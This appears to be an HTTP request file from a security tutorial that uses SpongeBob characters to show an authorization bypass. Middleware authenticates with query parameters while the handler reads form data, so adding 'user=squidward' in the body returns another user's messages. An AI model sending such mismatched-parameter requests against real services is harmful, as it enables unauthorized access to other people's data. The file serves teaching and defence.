### Expected Usage:
GET {{base}}/example3?user=spongebob&password=bikinibottom
#
# Normally, SpongeBob would get his *own* messages:
#
# {
#   "owner": "spongebob",
#   "messages": [
#     {
#       "from": "patrick",
#       "message": "Hey SpongeBob, wanna go jellyfishing?"
#     }
#   ]
# }
#

### Attack: Plankton exploits middleware/handler parameter source mismatch
GET {{base}}/example3?user=spongebob&password=bikinibottom
Content-Type: application/x-www-form-urlencoded

user=squidward
#
# SpongeBob gets Squidward's messages, even though he provided his own password!
#
# {
#   "owner": "squidward",
#   "messages": [
#     {
#       "from": "plankton",
#       "message": "Squidward, I'll pay you handsomely to 'accidentally' share the secret formula. You deserve better than that dead-end cashier job!"
#     },
#     {
#       "from": "mr.krabs",
#       "message": "Squidward, the new safe combination is 4-2-0-6-9. Don't write it down anywhere!"
#     }
#   ]
# }
#
# IMPACT: Plankton steals the safe combination AND uncovers Squidward's
# vulnerability to bribery! The middleware layer authenticates using query
# parameters (SpongeBob) while the handler layer reads from form data (Squidward).
# This demonstrates that cross-layer parsing inconsistencies are particularly
# dangerous because security logic and business logic execute in different
# components, making the vulnerability harder to spot during code review.
